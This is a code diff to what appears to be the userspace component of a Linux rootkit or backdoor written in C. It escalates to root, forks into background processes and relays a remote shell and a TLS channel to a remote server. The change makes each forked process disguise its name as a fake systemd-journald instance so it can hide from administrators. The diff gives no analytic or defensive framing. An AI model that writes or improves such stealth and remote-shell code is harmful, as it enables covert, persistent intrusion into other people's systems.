@@ -111,8 +111,7 @@ int create_remote_socket(void) {
     return remote_sock;
 }
 
-void mask_process(char** argv) {
-    const char* process_mask = "/usr/lib/systemd/systemd-journald";
+void mask_process(char** argv, const char *process_mask) {
     memset(argv[0], 0, strlen(argv[0]));
     strcpy(argv[0], process_mask);
     prctl(PR_SET_NAME, process_mask, 0, 0);
@@ -134,9 +133,11 @@ void mask_process(char** argv) {
  * TLS socket is a pure forwarder for the kernel module over TLS (since the kernel doesn't do TLS)
  */
 int main(int argc, char** argv) {
+    const char* mask_1 = "/usr/lib/systemd/systemd-journald2";
+    const char* mask_2 = "/usr/lib/systemd/systemd-journald3";
+    const char* mask_3 = "/usr/lib/systemd/systemd-journald4";
     setuid(0);
     setgid(0);
-    mask_process(argv);
 
     //Daemonize
     if (wrapped_fork()) {
@@ -192,6 +193,7 @@ int main(int argc, char** argv) {
                 return EXIT_SUCCESS;
             }
             setsid();
+            mask_process(argv, mask_1);
             //Remote shell read and write to remote server
             for (;;) {
                 int size = read(remote_shell_sock, buffer, MAX_PAYLOAD);
@@ -207,6 +209,7 @@ int main(int argc, char** argv) {
             }
         } else {
             setsid();
+            mask_process(argv, mask_2);
             //Read
             for (;;) {
                 int size = SSL_read(ssl, buffer, MAX_PAYLOAD);
@@ -229,6 +232,7 @@ int main(int argc, char** argv) {
         }
     } else {
         setsid();
+        mask_process(argv, mask_3);
         //Write
         for (;;) {
             int size = read(conn_sock, buffer, MAX_PAYLOAD);
